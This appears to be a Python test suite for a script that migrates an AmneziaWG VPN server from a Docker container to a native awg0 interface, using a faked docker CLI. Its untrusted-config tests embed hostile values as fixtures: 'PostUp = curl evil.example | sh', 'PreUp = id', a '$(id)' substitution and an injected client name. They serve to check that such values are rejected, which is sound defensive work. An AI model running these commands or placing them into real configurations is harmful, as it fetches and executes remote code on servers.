"""
test_amnezia.py — перенос сервера из Amnezia (Docker) в awg0 Тулзы.

Поддельный docker: контейнеры — каталоги в песочнице (их файлы, состояние,
политика автозапуска, проброс порта). awg-quick «поднимает» awg0 записью в
LINKS, awg show awg0 listen-port отвечает портом из awg0.conf.

Запуск:  python3 tests/test_amnezia.py [путь/к/awg2.sh]
"""
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from sandbox import *  # noqa: E402,F401,F403

DKR = os.path.join(TMP, "docker")
os.makedirs(DKR)
ENV["DKR"] = DKR
CONF = os.path.join(ROOT, "etc/amnezia/amneziawg/awg0.conf")
STATE = os.path.join(ROOT, "var/lib/awg2/amnezia")


def stub(name, body):
    p = os.path.join(BIN, name)
    with open(p, "w") as f:
        f.write("#!/usr/bin/env bash\n" + body + "\n")
    os.chmod(p, 0o755)


stub("docker", r'''echo "docker $*" >> "$CALLS"
R="$DKR"
last="${!#}"
case "$1" in
  ps) cat "$R/names" 2>/dev/null ;;
  inspect)
    shift; fmt=""; [[ "$1" == -f ]] && { fmt="$2"; shift 2; }
    c="$1"; grep -qx -- "$c" "$R/names" 2>/dev/null || exit 1
    case "$fmt" in
      *State.Running*) [[ "$(cat "$R/$c.state")" == running ]] && echo true || echo false ;;
      *RestartPolicy*) cat "$R/$c.restart" ;;
      *PortBindings*) cat "$R/$c.ports" 2>/dev/null ;;
      "") echo "[{}]" ;;
    esac ;;
  cp) c="${2%%:*}"; p="${2#*:}"; [[ -f "$R/$c$p" ]] || exit 1
      tar -cf - -C "$R/$c$(dirname "$p")" "$(basename "$p")" ;;
  update) for a in "$@"; do [[ "$a" == --restart=* ]] && echo "${a#--restart=}" > "$R/$last.restart"; done ;;
  stop) [[ -f "$R/stopfail" ]] && exit 1; echo exited > "$R/$last.state" ;;
  start) echo running > "$R/$last.state" ;;
  rm) grep -vx -- "$last" "$R/names" > "$R/names.n"; mv "$R/names.n" "$R/names" ;;
esac
exit 0''')
stub("awg-quick", r'''echo "awg-quick $*" >> "$CALLS"
case "$1" in
  up) [[ -f "$DKR/upfail" ]] && { echo "Address already in use" >&2; exit 1; }
      grep -qx awg0 "$LINKS" || echo awg0 >> "$LINKS" ;;
  down) grep -vx awg0 "$LINKS" > "$LINKS.n"; mv "$LINKS.n" "$LINKS" ;;
  strip) printf '[Interface]\nPrivateKey = x\n' ;;
esac
exit 0''')
os.rename(os.path.join(BIN, "awg"), os.path.join(BIN, "awg.orig"))
stub("awg", f'''if [[ "$1" == show && "${{3:-}}" == listen-port ]]; then
  grep -qx "$2" "$LINKS" && sed -n 's/^ListenPort = //p' "{CONF}"; exit 0
fi
exec "{BIN}/awg.orig" "$@"''')

# Перенос — с модулем, который умеет 3.1, и без записи юнитов в систему
PRE = ('proto_supported() { return 0; }; setup_autostart() { echo setup_autostart >> "$CALLS"; }; '
       'expire_install() { :; }; ')


def key(i):
    return base64.b64encode(bytes([i]) * 32).decode()


SRV_PRIV, HPK = key(1), key(2)
PEERS = [(key(10 + i), key(40 + i), "10.8.1.%d/32" % ip) for i, ip in enumerate((1, 2, 4, 5, 7, 8))]
NAMES = ["Phone [Android  (15.0)]", "kotik", "Пётр Щукин", "Мария\n# PostUp = curl x|sh", "", "kotik"]


def amn_conf(extra_iface="", priv=SRV_PRIV, peers=PEERS, port=51888, v31=True):
    p = "".join(f"[Peer]\nPublicKey = {pub}\nPresharedKey = {psk}\nAllowedIPs = {aip}\n" for pub, psk, aip in peers)
    v = ("HeaderProtectionKey = %s\nContentPaddingAddition = 10-100\nRekeyAfterTime = 100-120\n"
         "RekeyTimeout = 3-7\nRandomTrailers = on\nDisableCookies = on\n" % HPK) if v31 else ""
    return (f"[Interface]\nPrivateKey = {priv}\nAddress = 10.8.1.0/24\nListenPort = {port}\nJc = 4\nJmin = 10\n"
            f"Jmax = 50\nS1 = 14\nS2 = 89\nS3 = 30\nS4 = 12\nH1 = 1\nH2 = 2\nH3 = 3\nH4 = 4\n{v}{extra_iface}{p}")


def container(name="amnezia-awg2", conf=None, names=NAMES, state="running", restart="always", ports=None, file="awg0.conf"):
    """Чистый Docker с одним контейнером Amnezia."""
    shutil.rmtree(DKR)
    d = os.path.join(DKR, name, "opt/amnezia/awg")
    os.makedirs(d)
    with open(os.path.join(d, file), "w") as f:
        f.write(conf if conf is not None else amn_conf())
    table = [{"clientId": pub, "userData": {"clientName": n, "allowed_ips": aip}} for (pub, _, aip), n in zip(PEERS, names)]
    with open(os.path.join(d, "clientsTable"), "w") as f:
        json.dump(table, f, ensure_ascii=False)
    with open(os.path.join(DKR, "names"), "w") as f:
        f.write("other-app\n" + name + "\n")
    for k, v in (("state", state), ("restart", restart), ("ports", ports or "51888/udp 51888 \n")):
        with open(os.path.join(DKR, f"{name}.{k}"), "w") as f:
            f.write(v + ("\n" if k != "ports" else ""))


def reset():
    """Сервера Тулзы и следов переноса нет."""
    for p in (CONF,):
        if os.path.exists(p):
            os.remove(p)
    shutil.rmtree(STATE, ignore_errors=True)
    with open(LINKS, "w") as f:
        f.write("")
    reset_calls()


def dstate(name="amnezia-awg2"):
    with open(os.path.join(DKR, f"{name}.state")) as f:
        st = f.read().strip()
    with open(os.path.join(DKR, f"{name}.restart")) as f:
        return st, f.read().strip()


def scan():
    rc, out, err = bash(PRE + "amnezia_scan_json")
    try:
        return json.loads(out)
    except ValueError:
        return {"_raw": out + err}


def conf_text():
    with open(CONF) as f:
        return f.read()


print(f"Python {sys.version.split()[0]}")
print("\nНет Docker / нет контейнера")
os.makedirs(DKR, exist_ok=True)
with open(os.path.join(DKR, "names"), "w") as f:
    f.write("other-app\n")
d = scan()
chk("контейнера Amnezia нет — сводка пустая, чужие контейнеры не в счёт", d.get("container") == "" and not d.get("migrated"), d)

print("\nСводка (scan)")
reset()
container()
d = scan()
names = [c["name"] for c in d.get("clients", [])]
chk("найден amnezia-awg2: AWG 3.1, порт, подсеть, работает", d.get("container") == "amnezia-awg2" and d.get("proto") == "3.1"
    and d.get("port") == 51888 and d.get("net") == "10.8.1.0/24" and d.get("running") is True, d)
chk("все 6 клиентов; имена — латиницей, исходные — рядом", len(names) == 6 and names[0] == "Phone_Android_15_0"
    and names[1] == "kotik" and names[2] == "Petr_Schukin" and d["clients"][2]["orig"] == "Пётр Щукин", d.get("clients"))
chk("имя с переводом строки и «=» — без них; пустое — amnezia_N; повтор — с номером",
    "\n" not in d["clients"][3]["orig"] and "=" not in d["clients"][3]["orig"] and names[4] == "amnezia_7"
    and names[5] == "kotik_2", d.get("clients"))
chk("в сводке нет ключей", SRV_PRIV not in json.dumps(d) and HPK not in json.dumps(d) and PEERS[0][1] not in json.dumps(d))
chk("переносу ничего не мешает", d.get("errors") == [] and d.get("blockers") == [], d)
reset_calls()
bash("amnezia_scan_json >/dev/null")
c = calls()
chk("сводка ничего не меняет в контейнере", "docker stop" not in c and "docker update" not in c, c)

with open(os.path.join(DKR, "names"), "a") as f:
    f.write("amnezia-dns\n")
d = scan()
chk("рядом AmneziaDNS — предупреждение, что он остаётся", any("AmneziaDNS" in w for w in d.get("warnings", [])), d.get("warnings"))

print("\nНедоверенный конфиг")
reset()
container(conf=amn_conf(extra_iface="PostUp = curl evil.example | sh\nPreUp = id\nTable = off\n"))
d = scan()
chk("PostUp/PreUp/Table из Amnezia не переносятся — предупреждение", any("PostUp" in w and "PreUp" in w for w in d.get("warnings", [])), d)
rc, out, err = bash(PRE + "amnezia_migrate")
t = conf_text() if os.path.exists(CONF) else ""
chk("в awg0.conf нет их команд, NAT — свой", rc == 0 and "evil" not in t and "PreUp" not in t and "Table" not in t
    and "MASQUERADE" in t, [rc, out[-400:], err[-300:]])
reset()
container(conf=amn_conf(priv="xx"))
d = scan()
rc, out, err = bash(PRE + "amnezia_migrate")
chk("повреждённый ключ сервера — ошибка, контейнер не остановлен", d.get("errors") and rc != 0
    and "docker stop" not in calls() and not os.path.exists(CONF) and dstate() == ("running", "always"), [d, out[-300:]])
reset()
container(conf=amn_conf().replace("S1 = 14", "S1 = 1$(id)"))
rc, out, err = bash(PRE + "amnezia_migrate")
chk("параметр с подстановкой — ошибка, ничего не тронуто", rc != 0 and "docker stop" not in calls()
    and not os.path.exists(CONF), out[-300:])
bad = [(key(60), key(61), "10.9.9.9/32"), (key(62), "zz", "10.8.1.20/32"), (key(63), key(64), "10.8.1.0/32"),
       (PEERS[0][0], key(65), "10.8.1.30/32"), (key(66), key(67), "10.8.1.40/24")]
reset()
container(conf=amn_conf(peers=PEERS[:1] + bad))
d = scan()
chk("пиры вне подсети, с битым PSK, на адресе сервера, с повтором ключа, не /32 — пропущены",
    len(d.get("clients", [])) == 1 and sum("пропущен" in w for w in d.get("warnings", [])) == 5, d)

print("\nПеренос")
reset()
container()
rc, out, err = bash(PRE + "amnezia_migrate")
t = conf_text() if os.path.exists(CONF) else ""
c = calls()
chk("перенос прошёл: awg0 поднят, порт тот же", rc == 0 and os.path.exists(CONF) and "awg0" in open(LINKS).read()
    and "ListenPort = 51888" in t, [rc, out[-500:], err[-400:]])
chk("ключ сервера, адрес и параметры AWG 3.1 — как в Amnezia", f"PrivateKey = {SRV_PRIV}" in t and "Address = 10.8.1.0/24" in t
    and f"HeaderProtectionKey = {HPK}" in t and "RandomTrailers = on" in t and "# AWG_PROTO=3.1" in t, t[:900])
chk("все пиры с PSK и адресами, метка «перенесён»", all(f"PublicKey = {p}\nPresharedKey = {s}\nAllowedIPs = {a}" in t
                                                          for p, s, a in PEERS) and t.count("# amnezia=") == 6, t[-900:])
chk("awg0.conf — 600", oct(os.stat(CONF).st_mode & 0o777) == "0o600", oct(os.stat(CONF).st_mode))
chk("контейнер остановлен и без автозапуска, не удалён", dstate() == ("exited", "no") and "docker rm" not in c, [dstate(), c[-400:]])
chk("автозапуск awg0 включён", "setup_autostart" in c, c[-300:])
chk("копия файлов контейнера с ключами удалена, состояние — 600", not os.path.exists(os.path.join(STATE, "orig"))
    and oct(os.stat(os.path.join(STATE, "container")).st_mode & 0o777) == "0o600", os.listdir(STATE))
rc2, out2, _ = bash("clients_tsv | cut -f1")
chk("клиенты Тулзы — с перенесёнными именами", out2.split() == ["Phone_Android_15_0", "kotik", "Petr_Schukin",
                                                               "Mariya_PostUp_curl_x_sh", "amnezia_7", "kotik_2"], out2)
rc2, out2, _ = bash("free_client_ip")
chk("новый клиент получит свободный адрес, а не адрес сервера .0", out2.strip() == "10.8.1.3/32", out2)
rc2, out2, err2 = bash("client_no_conf Phone_Android_15_0")
chk("конфига перенесённого нет — честная причина и «Перевыпустить»", rc2 != 0 and "перенесён из Amnezia" in out2 + err2
    and "Перевыпустить" in out2 + err2, out2 + err2)
rc2, out2, err2 = bash("client_set_mimicry kotik quic")
chk("мимикрию перенесённому не сменить — та же причина", rc2 != 0 and "перенесён из Amnezia" in out2 + err2, out2 + err2)
rc2, out2, _ = bash('server_exists && py clients-json "$SERVER_CONF" /dev/null "$CLIENT_DIR" "" "" ""')
rows = {r["name"]: r for r in json.loads(out2 or "[]")}
chk("в списке клиентов: перенесён, исходное имя, файла нет", rows.get("Petr_Schukin", {}).get("amnezia") == "Пётр Щукин"
    and rows["Petr_Schukin"].get("file") == "" and rows["kotik"].get("amnezia") == "kotik", out2[:400])
db = os.path.join(ROOT, "var/lib/awg2/traffic.json")
with open(db, "w") as f:
    json.dump({"v": 1, "last": {PEERS[1][0]: [5, 5]}, "total": {PEERS[1][0]: 123}, "reset": {}, "warned": {},
               "days": {"2026-10-01": {PEERS[1][0]: [100, 20]}}}, f)
reset_calls()
rc2, out2, err2 = bash(PRE + "client_reissue kotik")
cf = os.path.join(ROOT, "root/kotik_awg3.conf")
t = conf_text()
with open(db) as f:
    tdb = json.load(f)
chk("перевыпуск: новый конфиг с прежним адресом, старый ключ снят с awg0",
    rc2 == 0 and os.path.isfile(cf) and "Address = 10.8.1.2/32" in open(cf).read() and PEERS[1][0] not in t
    and f"awg set awg0 peer {PEERS[1][0]} remove" in calls(), [rc2, out2[-300:], err2[-300:]])
blk = t.split("# kotik\n", 1)[1].split("[Peer]", 1)[0] if "# kotik\n" in t else ""
chk("у перевыпущенного метки «перенесён» больше нет, PSK новый", "# amnezia=" not in blk and PEERS[1][1] not in blk
    and "PresharedKey = " in blk, blk)
newpub = re.search(r"PublicKey = (\S+)", blk).group(1) if blk else ""
chk("счётчики трафика — на новом ключе", tdb["total"].get(newpub) == 123 and PEERS[1][0] not in tdb["total"]
    and tdb["days"]["2026-10-01"].get(newpub) == [100, 20], tdb)
rc, out, err = bash(PRE + "amnezia_migrate")
chk("повторный перенос — отказ", rc != 0 and "уже сделан" in out + err, out[-300:])
d = scan()
chk("сводка после переноса: «перенесено»", d.get("migrated") is True and d.get("container") == "amnezia-awg2", d)

print("\nВернуть Amnezia")
reset_calls()
rc, out, err = bash("amnezia_revert")
chk("revert: awg0 снят, awg0.conf убран, контейнер запущен с прежним автозапуском",
    rc == 0 and not os.path.exists(CONF) and "awg0" not in open(LINKS).read() and dstate() == ("running", "always")
    and not os.path.exists(STATE), [rc, out[-400:], err[-300:]])
chk("перед снятием — бэкап сервера Тулзы", any(f.startswith("awg2_backup_") for f in os.listdir(os.path.join(ROOT, "awg_backup"))),
    os.listdir(os.path.join(ROOT, "awg_backup")))
rc, out, err = bash("amnezia_revert")
chk("revert без переноса — отказ", rc != 0, out)

print("\nОткат при ошибке")
reset()
container(restart="unless-stopped")
open(os.path.join(DKR, "upfail"), "w").close()
rc, out, err = bash(PRE + "amnezia_migrate")
os.remove(os.path.join(DKR, "upfail"))
chk("awg0 не поднялся — Amnezia возвращена как была, awg0.conf убран",
    rc != 0 and not os.path.exists(CONF) and dstate() == ("running", "unless-stopped") and not os.path.exists(STATE),
    [rc, dstate(), out[-500:]])
reset()
container()
open(os.path.join(DKR, "stopfail"), "w").close()
rc, out, err = bash(PRE + "amnezia_migrate")
os.remove(os.path.join(DKR, "stopfail"))
chk("контейнер не остановился — перенос не начат, автозапуск возвращён", rc != 0 and not os.path.exists(CONF)
    and dstate() == ("running", "always"), [dstate(), out[-300:]])

print("\nЧто мешает переносу")
reset()
container()
with open(CONF, "w") as f:
    f.write(OLD20)
d = scan()
rc, out, err = bash(PRE + "amnezia_migrate")
chk("свой сервер Тулзы уже есть — отказ, контейнер не тронут", "server" in d.get("blockers", []) and rc != 0
    and "docker stop" not in calls() and dstate() == ("running", "always") and conf_text() == OLD20, [d.get("blockers"), out[-300:]])
reset()
container()
rc, out, err = bash('proto_supported() { return 1; }; expire_install() { :; }; amnezia_migrate')
chk("модуль не умеет 3.1 — отказ до остановки", rc != 0 and "docker stop" not in calls() and "AWG 3.1" in out + err, out[-300:])

print("\nПорт и старый контейнер")
reset()
container(ports="51888/udp 443 \n")
rc, out, err = bash(PRE + "amnezia_migrate")
chk("порт проброшен наружу другим номером — awg0 слушает внешний", rc == 0 and "ListenPort = 443" in conf_text(),
    [out[-300:], err[-200:]])
reset()
container(name="amnezia-awg", file="wg0.conf", conf=amn_conf(v31=False).replace("S3 = 30\nS4 = 12\n", ""))
d = scan()
chk("старый amnezia-awg (wg0.conf, AWG 1.x) — как AWG 2.0", d.get("container") == "amnezia-awg" and d.get("proto") == "2.0"
    and len(d.get("clients", [])) == 6, d)
rc, out, err = bash(PRE + "amnezia_migrate")
chk("старый контейнер переносится", rc == 0 and "# AWG_PROTO=2.0" in conf_text() and dstate("amnezia-awg")[0] == "exited",
    out[-300:])

print("\nУдалить контейнер")
rc, out, err = bash("amnezia_remove")
chk("после переноса контейнер удаляется, следы переноса — тоже", rc == 0 and "docker rm -f amnezia-awg" in calls()
    and not os.path.exists(STATE), out[-300:])
reset()
container()
rc, out, err = bash("amnezia_remove")
chk("без переноса удалять нельзя", rc != 0 and "docker rm" not in calls(), out)

print("\nAPI")
reset()
container()
API = api_wrapper()
r = subprocess.run([API, "amnezia", "status"], capture_output=True, text=True, env=ENV, timeout=60)
st = json.loads(r.stdout.strip().splitlines()[-1]) if r.stdout.strip() else {}
chk("api amnezia status", st.get("ok") and st["data"].get("container") == "amnezia-awg2" and st["data"].get("running") is True
    and st["data"].get("migrated") is False, r.stdout[-300:] + r.stderr[-300:])
r = subprocess.run([API, "amnezia", "scan"], capture_output=True, text=True, env=ENV, timeout=60)
st = json.loads(r.stdout.strip().splitlines()[-1]) if r.stdout.strip() else {}
chk("api amnezia scan — клиенты и без ключей", st.get("ok") and len(st["data"].get("clients") or []) == 6
    and SRV_PRIV not in r.stdout, r.stdout[-300:])

summary()
